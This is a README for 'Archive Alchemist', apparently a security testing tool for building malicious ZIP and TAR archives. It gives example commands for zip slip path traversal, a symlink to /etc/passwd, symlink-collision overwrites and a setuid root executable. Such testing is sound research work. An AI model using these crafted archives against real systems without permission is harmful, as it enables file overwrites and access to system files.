# Archive Alchemist

Archive Alchemist is a security research tool for creating specially crafted archives to test extraction vulnerabilities. 100% vibecoded, use at own disposal.

## Features

- Create ZIP and TAR archives with malicious patterns
- Support for path traversal attacks
- Support for symlinks and hardlinks
- Ability to set special permission bits (setuid, setgid, sticky bit)
- Fine-grained control over file attributes (mode, uid, gid, mtime)
- Multiple manipulation commands: add, replace, append, modify
- Multiple helper commands: extract, list

## Installation

```bash
# Clone the repository
git clone https://github.com/avlidienbrunn/archive-alchemist.git
cd archive-alchemist

# Make the script executable
chmod +x archive-alchemist.py

# Optional: create a symlink to use globally
sudo ln -s $(pwd)/archive-alchemist.py /usr/local/bin/archive-alchemist
```

## Usage

See [Documentation](docs/index.md)

### Examples for Security Testing

#### Zip Slip Attack

```bash
# Create a zip with path traversal payload
./archive-alchemist.py -f zipslip.zip add "../../../tmp/evil.txt" --content "I escaped the extraction directory!"
```

#### Symlink Attack

```bash
# Create a tar with a symlink pointing to a sensitive file
./archive-alchemist.py -f symlink_attack.tar -t tar add .bashrc --symlink "/etc/passwd"
```

#### File Collisions with Symlinks

```bash
# First add a symlink
./archive-alchemist.py -f collision.tar -t tar add config.txt --symlink "/tmp/target.txt"

# Then add a regular file with the same name (will be extracted last)
./archive-alchemist.py -f collision.tar -t tar add config.txt --content "Overwrite after symlink is created"
```

#### Setuid Executable

```bash
# Create a setuid executable
./archive-alchemist.py -f setuid_attack.tar -t tar add exploit --content "#!/bin/sh\nwhoami" --mode 0755 --setuid --uid 0
```

## Security Considerations

This tool is designed for security research and vulnerability testing. Using it against systems without explicit permission is illegal and unethical.